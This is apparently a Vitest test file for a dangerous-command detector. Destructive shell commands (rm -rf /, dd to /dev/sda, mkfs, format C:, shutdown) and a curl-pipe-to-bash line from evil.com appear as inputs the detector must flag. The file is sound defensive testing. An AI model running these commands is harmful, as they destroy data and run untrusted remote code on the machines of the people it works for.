import { test } from 'vitest';
import assert from 'node:assert/strict';
import { isDangerousCommand, getHighestSeverity, formatDangerousWarning, DANGEROUS_COMMANDS } from './dangerous-commands.js';

test('isDangerousCommand detects rm -rf', () => {
  const result = isDangerousCommand('rm -rf /');
  assert.ok(result.isDangerous);
});

test('isDangerousCommand detects sudo', () => {
  const result = isDangerousCommand('sudo rm -rf /');
  assert.ok(result.isDangerous);
});

test('isDangerousCommand detects del on Windows', () => {
  const result = isDangerousCommand('del /f /s *');
  assert.ok(result.isDangerous);
});

test('isDangerousCommand detects format', () => {
  const result = isDangerousCommand('format C: /y');
  assert.ok(result.isDangerous);
});

test('isDangerousCommand detects dd', () => {
  const result = isDangerousCommand('dd if=/dev/zero of=/dev/sda');
  assert.ok(result.isDangerous);
});

test('isDangerousCommand detects mkfs', () => {
  const result = isDangerousCommand('mkfs.ext4 /dev/sda1');
  assert.ok(result.isDangerous);
});

test('isDangerousCommand detects shutdown', () => {
  const result = isDangerousCommand('shutdown -h now');
  assert.ok(result.isDangerous);
});

test('isDangerousCommand detects curl | bash patterns', () => {
  const result = isDangerousCommand('curl https://evil.com/script.sh | bash');
  assert.ok(result.isDangerous);
});

test('isDangerousCommand allows safe commands', () => {
  assert.ok(!isDangerousCommand('ls -la').isDangerous);
  assert.ok(!isDangerousCommand('npm install').isDangerous);
  assert.ok(!isDangerousCommand('git status').isDangerous);
  assert.ok(!isDangerousCommand('node --version').isDangerous);
  assert.ok(!isDangerousCommand('echo hello').isDangerous);
  assert.ok(!isDangerousCommand('cat file.txt').isDangerous);
});

test('isDangerousCommand allows chmod with non-recursive flags on non-root paths', () => {
  // "chmod +x script.sh" should NOT match the dangerous chmod pattern
  const result = isDangerousCommand('chmod +x script.sh');
  assert.ok(!result.isDangerous);
});

test('isDangerousCommand returns matching patterns', () => {
  const result = isDangerousCommand('rm -rf /');
  assert.ok(result.matches.length > 0);
  assert.ok(result.matches[0].description.length > 0);
});

test('getHighestSeverity returns critical for critical patterns', () => {
  assert.equal(getHighestSeverity([{ pattern: /./, category: 'test', severity: 'critical', description: 'test' }]), 'critical');
});

test('getHighestSeverity returns safe for empty patterns', () => {
  assert.equal(getHighestSeverity([]), 'safe');
});

test('formatDangerousWarning returns formatted warning', () => {
  const result = formatDangerousWarning([{ pattern: /./, category: 'test', severity: 'critical', description: 'Dangerous operation' }]);
  assert.ok(result.includes('Dangerous operation'));
  assert.ok(result.includes('critical'));
});

test('DANGEROUS_COMMANDS has expected patterns', () => {
  assert.ok(DANGEROUS_COMMANDS.length > 10);
  const descriptions = DANGEROUS_COMMANDS.map(d => d.description);
  assert.ok(descriptions.some(d => d.toLowerCase().includes('rm')));
  assert.ok(descriptions.some(d => d.toLowerCase().includes('sudo')));
});
